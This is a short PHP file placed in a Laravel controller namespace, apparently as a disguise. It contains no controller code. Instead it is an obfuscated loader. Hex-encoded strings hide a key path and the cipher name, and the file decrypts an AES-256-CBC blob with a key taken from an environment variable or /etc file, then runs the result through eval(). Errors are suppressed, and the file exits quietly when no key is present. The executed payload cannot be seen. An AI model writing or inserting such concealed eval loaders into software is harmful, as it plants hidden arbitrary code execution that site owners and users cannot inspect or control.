<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('hM4PH/rRHSNP3n7B5rDv1Q==');

$c=base64_decode(

'Xrq5VTxLs23tDzQsdTqOqSDSLcWYk6Q9MvE9QoRUPNXCroDwPpC940SwRyQG+mymj/lwtJPSpw7s' .
'bdJjjKFCfBY/ZNXkiOCud+r+BHqZnh0u48iPIMD3avW6Mt1aEC/zcAKnuf4HCU3f/eLWfgAgxEvQ' .
'Z83gNsutT5L/l00MW1YvjKTZmP9rxf9SeWBuaZXP5Z59ca+EhDnp4iuwXIsyCPoLmg4IdStg5WQM' .
'bWEizL1XCYcOFxcMCM9zq/i7A6Qx'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

